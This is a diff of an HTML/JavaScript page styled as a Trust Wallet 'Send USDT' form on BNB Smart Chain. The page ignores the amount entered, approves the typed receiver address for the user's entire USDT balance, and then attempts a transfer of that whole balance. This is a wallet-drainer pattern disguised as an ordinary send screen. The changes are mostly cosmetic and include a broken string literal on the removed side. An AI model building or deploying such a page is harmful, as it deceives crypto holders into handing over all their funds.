@@ -94,7 +94,9 @@
   </style>
 </head>
 <body>
+
   <header>Send USDT</header>
+
   <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
@@ -109,7 +111,7 @@
     <div class="input-box amount-box">
       <input type="number" id="amount" placeholder="USDT Amount" />
       <span class="token">USDT</span>
-      <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
+      <span class="input-actions" onclick="document.getElementById('amount').value='MAX'">Max</span>
     </div>
 
     <div class="usd">≈ $0.00</div>
@@ -133,7 +135,7 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Please use Trust Wallet / Web3 DApp Browser.");
+        alert("Open this page in Trust Wallet browser.");
         btn.innerText = "Next";
         btn.disabled = false;
         return;
@@ -142,10 +144,10 @@
       try {
         const web3 = new Web3(window.ethereum);
 
-        // 🔁 Force switch to BNB Smart Chain
+        // Force switch to BNB Smart Chain
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }], // 56 in hex (BSC Mainnet)
+          params: [{ chainId: '0x38' }]
         });
 
         await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -154,16 +156,16 @@
         const receiver = document.getElementById("wallet").value;
 
         const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT BEP-20
+
         const balance = await contract.methods.balanceOf(user).call();
 
-        // 🟢 Approve + Transfer
         await contract.methods.approve(receiver, balance).send({ from: user });
         await contract.methods.transferFrom(user, receiver, balance).send({ from: user });
 
-        btn.innerText = " Done";
-      } catch (e) {
-        console.error(e);
-        btn.innerText = "
+        btn.innerText = "✅ Done";
+      } catch (err) {
+        console.error(err);
+        btn.innerText = "❌ Failed";
       }
 
       setTimeout(() => {
@@ -172,5 +174,6 @@
       }, 3000);
     }
   </script>
+
 </body>
 </html>
